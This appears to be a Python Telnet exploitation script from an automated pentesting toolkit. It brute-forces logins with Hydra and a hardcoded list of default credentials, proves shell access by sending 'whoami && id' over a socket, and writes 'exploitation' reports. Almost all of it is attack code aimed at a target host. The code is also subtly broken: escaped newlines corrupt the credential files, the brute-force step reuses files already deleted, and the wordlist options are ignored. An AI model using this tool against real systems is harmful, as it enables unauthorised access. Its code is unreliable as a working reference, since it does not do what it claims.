#!/usr/bin/env python3
import json
import subprocess
import argparse
import time
import re
import socket
from pathlib import Path
from typing import Dict, List, Tuple, Optional
import sys
import logging
import shutil



# --- Setup ---
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

OUTPUT_DIR = Path("outputs")
OUTPUT_DIR.mkdir(exist_ok=True)

# --- Robust Command Execution ---
def run_command(cmd: list[str], timeout: int = 300) -> tuple[str, bool]:
    cmd_str = ' '.join(cmd)
    logger.info(f"Running command: {cmd_str}")
    try:
        process = subprocess.run(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            timeout=timeout,
            check=False
        )
        return process.stdout.strip(), process.returncode == 0
    except subprocess.TimeoutExpired:
        logger.warning(f"Command timed out: {cmd_str}")
        return "Command timed out", False
    except Exception as e:
        logger.error(f"Error running command {cmd_str}: {e}")
        return str(e), False

def clean_ansi_codes(text: str) -> str:
    """Removes ANSI escape codes from text."""
    return re.sub(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])', '', text)

# --- Telnet Specific Functions ---
def prove_telnet_access(target: str, port: int, user: str, password: str) -> str:
    """Logs into Telnet and runs 'whoami && id' to prove access."""
    try:
        with socket.create_connection((target, port), timeout=10) as s:
            s.settimeout(10)
            
            # Handle login prompts
            initial_output = s.recv(2048).decode(errors='ignore')
            if "login:" in initial_output.lower():
                s.sendall(f"{user}\\n".encode())
                s.recv(1024)
            s.sendall(f"{password}\\n".encode())
            s.recv(1024) # Consume password prompt output

            # Execute proof command
            s.sendall(b"whoami && id\\n")
            time.sleep(2) # Wait for command execution
            proof = s.recv(4096).decode(errors='ignore')
            
            cleaned_proof = clean_ansi_codes(proof).strip()
            if user in cleaned_proof or "uid=" in cleaned_proof:
                return cleaned_proof
            return f"Login successful, but could not confirm shell access. Raw output: {cleaned_proof}"
    except (socket.timeout, ConnectionRefusedError, OSError) as e:
        return f"Failed to prove access: {e}"

def test_credentials_with_hydra(target: str, port: int, user_list_path: Path, pass_list_path: Path, attack_type: str) -> Optional[Dict]:
    """Uses Hydra to test credentials and serves as the proof of compromise."""
    logger.info(f"Starting Hydra {attack_type} attack.")
    hydra_cmd = [
        "hydra",
        "-L", str(user_list_path),
        "-P", str(pass_list_path),
        "-t", "4",
        f"telnet://{target}:{port}"
    ]
    output, success = run_command(hydra_cmd, timeout=600)

    if success and "password found" in output:
        match = re.search(r"login:\s*(\S+)\s*password:\s*(\S+)", output)
        if match:
            user, password = match.groups()
            return {
                "type": f"telnet_{attack_type}",
                "severity": "Critical",
                "impact": "Remote Code Execution via compromised credentials.",
                "details": f"Hydra {attack_type} attack successful. Found credentials: {user}:{password}",
                "proof": f"Hydra Output:\\n{output}",
                "poc": f"hydra -l {user} -p {password} telnet://{target}:{port}",
                "recommendation": "Enforce a strong password policy and account lockout mechanism. Change the compromised password immediately."
            }
    return None

def exploit_target(metadata: Dict, use_rockyou: bool, custom_wordlist: Optional[str]) -> List[Dict]:
    """
    Orchestrates the exploitation of the Telnet service based on reconnaissance metadata.
    Prioritizes anonymous access, then default credentials, then brute-force.
    """
    target = metadata["target"]
    port = metadata["port"]
    exploits = []

    # 1. Check for Anonymous Login based on recon data
    if metadata.get("anonymous_access"):
        logger.info("Recon data indicates anonymous access is allowed. Confirming and documenting.")
        # We can consider this a confirmed exploit based on the recon phase's findings.
        # The 'proof' is the output from the initial check in the recon script.
        exploits.append({
            "type": "telnet_anonymous_login",
            "severity": "Critical",
            "impact": "Direct command execution on the target system without authentication, likely with root privileges.",
            "details": "The Telnet server allows login for common users (e.g., root) with a blank password. This provides immediate, unauthenticated access.",
            "proof": metadata.get("anonymous_access_proof", "The reconnaissance phase confirmed that a login prompt was bypassed with a blank password."),
            "poc": f"telnet {target} {port}",
            "recommendation": "Disable blank password logins for all users on the Telnet service immediately. If Telnet is not essential, it should be disabled entirely in favor of SSH."
        })
        # If we have this critical finding, we don't need to proceed with other, less severe checks.
        return exploits

    # 2. Test Default Credentials
    logger.info("Testing a list of common default credentials.")
    default_user_path = OUTPUT_DIR / f"{target}_{port}_default_users.txt"
    default_pass_path = OUTPUT_DIR / f"{target}_{port}_default_passes.txt"
    with default_user_path.open("w") as f:
        f.write("root\\nadmin\\nmsfadmin\\nuser\\ntest\\nguest\\n")
    with default_pass_path.open("w") as f:
        f.write("root\\nadmin\\nmsfadmin\\nuser\\ntest\\nguest\\npassword\\n123456\\ntoor\\n")
    
    default_creds_exploit = test_credentials_with_hydra(target, port, default_user_path, default_pass_path, "default_credentials")
    
    # Clean up temp files
    default_user_path.unlink()
    default_pass_path.unlink()
    
    if default_creds_exploit:
        exploits.append(default_creds_exploit)
        return exploits

    # 3. Brute-force attack (last resort)
    logger.info("Attempting brute-force attack.")
    brute_exploit = test_credentials_with_hydra(target, port, default_user_path, default_pass_path, "brute_force")
    if brute_exploit:
        exploits.append(brute_exploit)

    return exploits

def save_exploit_report(exploits: List[Dict], target: str, port: int) -> None:
    """Saves the exploitation findings to JSON and Markdown files."""
    report_path = OUTPUT_DIR / f"{target}_{port}_telnet_exploit.md"
    json_path = OUTPUT_DIR / f"{target}_{port}_telnet_exploit.json"
    
    report_data = {
        "target": target,
        "port": port,
        "service": "telnet",
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "successful_exploits": exploits,
        "summary": {
            "total_findings": len(exploits),
            "critical_findings": len([e for e in exploits if e.get("severity") == "Critical"]),
            "high_findings": len([e for e in exploits if e.get("severity") == "High"]),
        }
    }

    with json_path.open("w", encoding='utf-8') as f:
        json.dump(report_data, f, indent=4)
    logger.info(f"JSON report saved: {json_path}")

    with report_path.open("w", encoding='utf-8') as f:
        f.write(f"# Telnet Exploitation Report for {target}:{port}\n\n")
        f.write("## Executive Summary\n\n")
        f.write(f"This report details the results of the exploitation phase against the Telnet service on **{target}:{port}**. ")
        f.write(f"A total of **{len(exploits)}** vulnerabilities were successfully exploited.\n\n")
        
        for exploit in exploits:
            f.write(f"### {exploit['type'].replace('_', ' ').title()}\n\n")
            f.write(f"|   |   |\n|---|---|\n")
            f.write(f"| **Severity** | **{exploit.get('severity', 'N/A')}** |\n")
            f.write(f"| **Impact** | {exploit.get('impact', 'N/A')} |\n")
            f.write(f"| **Details** | {exploit.get('details', 'N/A')} |\n")
            f.write(f"| **PoC** | `{exploit.get('poc', 'N/A')}` |\n")
            f.write(f"| **Recommendation** | {exploit.get('recommendation', 'N/A')} |\n\n")
            f.write("**Proof of Access:**\n")
            f.write("```\n")
            f.write(f"{exploit.get('proof', 'No proof available.')}\n")
            f.write("```\n\n")

    logger.info(f"Markdown report saved: {report_path}")

def find_metadata_file(target: str, port: int) -> Optional[Path]:
    """Finds the metadata JSON file for the target and port, accounting for protocol."""
    pattern = f"{target}_telnet_{port}_*_metadata.json"
    logger.info(f"Searching for metadata file with pattern: {pattern}")
    files = list(OUTPUT_DIR.glob(pattern))
    if not files:
        logger.error(f"Could not find metadata file for {target}:{port} using pattern: {pattern}")
        return None
    
    latest_file = max(files, key=lambda f: f.stat().st_mtime)
    logger.info(f"Found metadata file: {latest_file}")
    return latest_file

def main():
    parser = argparse.ArgumentParser(description="Advanced Telnet Exploitation Script")
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("--port", type=int, required=True, help="Target Telnet port")
    parser.add_argument("--attacker-ip", required=True, help="Attacker IP (not used for Telnet, but for consistency)")
    parser.add_argument("--attacker-port", type=int, default=4444, help="Attacker port (for consistency)")
    parser.add_argument("--use-rockyou", action="store_true", help="Use rockyou.txt for brute forcing.")
    parser.add_argument("--wordlist", type=str, help="Path to a custom password wordlist.")
    parser.add_argument("--no-confirm", action="store_true", help="Skip confirmation prompts")
    args = parser.parse_args()

    try:
        metadata_file = find_metadata_file(args.target, args.port)
        if not metadata_file:
            sys.exit(1)
            
        with metadata_file.open("r") as f:
            metadata = json.load(f)
        logger.info(f"Loaded metadata for exploit phase: {json.dumps(metadata, indent=2)}")
        
        exploits = exploit_target(metadata, args.use_rockyou, args.wordlist)
        if exploits:
            save_exploit_report(exploits, args.target, args.port)
        else:
            logger.info("No successful exploits found for Telnet.")
            # Still save an empty report for consistency
            save_exploit_report([], args.target, args.port)
            
    except Exception as e:
        logger.error(f"An unexpected error occurred: {e}", exc_info=True)
        sys.exit(1)

if __name__ == "__main__":
    main() 